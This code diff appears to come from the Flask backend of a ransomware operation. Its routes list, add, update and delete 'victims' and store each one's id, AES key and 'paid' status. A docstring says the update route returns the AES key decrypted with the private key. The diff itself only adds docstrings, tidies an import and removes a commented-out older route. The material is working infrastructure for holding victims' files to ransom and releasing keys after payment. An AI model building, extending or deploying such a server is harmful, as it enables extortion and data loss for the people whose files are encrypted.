@@ -4,7 +4,7 @@ from flask import Flask, jsonify, request
 from flask_cors import CORS
 from db import victims
 import time
-from base64 import b64decode,b64encode
+from base64 import b64decode, b64encode
 
 V = victims()
 
@@ -34,12 +34,24 @@ CORS(app, resources={r'/*': {'origins': '*'}})
 
 @app.route('/victims', methods=['GET'])
 def all_victims():
+    """
+    get all the victims
+    
+    Returns:
+        json -- all the victims
+    """
     response = {'status': 'success'}
     response['victims'] = V.vicList
     return jsonify(response)
 
 @app.route('/victims/add', methods=['POST'])
 def add_victim():
+    """
+    add a new victim
+    
+    Returns:
+        json -- success/failure message
+    """
     if not request.is_json:
         return '400 Not Json'
     post_data = request.get_json()
@@ -67,6 +79,15 @@ def add_victim():
 
 @app.route('/victims/<victim_id>', methods=['POST', 'DELETE'])
 def update_victim(victim_id):
+    """
+    delete a victim or update the status of the victim
+    
+    Arguments:
+        victim_id {str} -- id of victim
+    
+    Returns:
+        json -- including aes_key decrypted by the private key
+    """
     # if not request.is_json:
     #     return '400 Not Json'
     post_data = request.get_json()
@@ -92,29 +113,6 @@ def update_victim(victim_id):
     #     response['message'] = 'Do not play tricks!'
     return jsonify(response)
 
-
-# @app.route('/victims/<victim_id>', methods=['PUT', 'DELETE'])
-# def single_victim(victim_id):
-#     response = {'status': 'success'}
-#     if request.method == 'PUT':
-#         post_data = request.get_json()
-#         response['post_data'] = post_data
-#         remove_victim(victim_id)
-#         VICTIMS.append({
-#             # 'id': uuid.uuid4().hex,
-#             'id': post_data.get('victim_id'),
-#             'aes_key': post_data.get('aes_key'),
-#             'paid': post_data.get('paid')
-#         })
-#         response['message'] = 'Victim updated!'
-#     if request.method == 'DELETE':
-#         response['id'] = victim_id
-#         if remove_victim(victim_id):
-#             response['message'] = 'Victim removed!'
-#         else:
-#             response['status'] = 'False'
-#             response['message'] = 'Victim failed!'
-#     return jsonify(response)
 
 
 if __name__ == '__main__':
